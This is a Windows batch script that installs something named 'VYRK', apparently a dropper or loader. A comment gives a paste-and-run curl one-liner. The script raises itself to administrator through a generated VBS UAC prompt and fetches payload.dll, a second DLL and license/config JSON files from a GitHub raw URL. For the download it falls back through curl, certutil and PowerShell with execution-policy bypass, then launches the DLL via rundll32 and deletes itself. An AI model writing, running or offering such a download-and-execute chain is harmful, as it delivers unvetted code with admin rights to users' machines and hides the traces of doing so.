@echo off
setlocal

rem =====================================================================
rem  One-liner:
rem    curl -s --ssl-no-revoke https://raw.githubusercontent.com/Gtx047/Gtx/refs/heads/main/install.bat -o %TEMP%\See.bat & %TEMP%\See.bat
rem =====================================================================

fltmc >nul 2>&1
if %errorlevel% equ 0 goto :IS_ADMIN
if /i "%~1"=="__ELEVATED__" goto :ELEV_FAILED

echo.
echo  [!] Need Administrator privileges!
echo  [*] Restarting as Admin...
echo.

echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\See_elev.vbs"
echo UAC.ShellExecute "%~s0", "__ELEVATED__", "", "runas", 1 >> "%TEMP%\See_elev.vbs"
cscript //nologo "%TEMP%\See_elev.vbs"
del /f /q "%TEMP%\See_elev.vbs" >nul 2>&1
exit /b

:ELEV_FAILED
echo.
echo  [-] Cannot get Administrator privileges!
echo.
echo  Please open CMD as Administrator:
echo    1. Press Win key, type "cmd"
echo    2. Right-click ^> "Run as administrator"
echo    3. Run the command again
echo.
pause
exit /b 1

:IS_ADMIN
echo.
echo  [*] VYRK

set "B=https://raw.githubusercontent.com/Gtx047/Gtx/refs/heads/main"
set "D=%LOCALAPPDATA%\VYRK"

if not exist "%D%" mkdir "%D%"
if not exist "%D%\data" mkdir "%D%\data"

echo  [*] Downloading...

call :get payload.dll    "%D%\payload.dll"
if errorlevel 1 goto :FAIL
call :get vyrk_orig.dll  "%D%\vyrk_orig.dll"
if errorlevel 1 goto :FAIL
call :get init.json      "%D%\data\init.json"
if errorlevel 1 goto :FAIL
call :get lic.json       "%D%\data\lic.json"
if errorlevel 1 goto :FAIL
call :get var.json       "%D%\data\var.json"
if errorlevel 1 goto :FAIL
call :get clean.bat      "%D%\clean.bat"
if errorlevel 1 goto :FAIL

copy /y "%D%\clean.bat" "%USERPROFILE%\Desktop\VYRK Clean.bat" >nul 2>&1

> "%D%\start.bat" echo @echo off
>> "%D%\start.bat" echo cd /d "%%~dp0"
>> "%D%\start.bat" echo rundll32.exe "%%~dp0payload.dll",Entry

echo  [+] Installed to %D%
echo  [*] Loading...
start "" rundll32.exe "%D%\payload.dll",Entry
goto :self_delete

:FAIL
echo  [-] Download failed!
pause
goto :self_delete

:get
curl.exe -sL --ssl-no-revoke "%B%/%~1" -o "%~2.new" 2>nul
if not exist "%~2.new" certutil -urlcache -split -f "%B%/%~1" "%~2.new" >nul 2>&1
if not exist "%~2.new" powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "try { Invoke-WebRequest -Uri '%B%/%~1' -OutFile '%~2.new' -UseBasicParsing; exit 0 } catch { exit 1 }" >nul 2>&1
if not exist "%~2.new" exit /b 1
for %%A in ("%~2.new") do if %%~zA LSS 100 ( del /f /q "%~2.new" & exit /b 1 )
move /y "%~2.new" "%~2" >nul 2>&1
exit /b 0

:self_delete
del /f /q "%D%\*.new" >nul 2>&1
del /f /q "%TEMP%\See_elev.vbs" >nul 2>&1
set "SELF=%~f0"
start /b "" cmd.exe /c "ping 127.0.0.1 -n 2 >nul & del /f /q %SELF%"
exit /b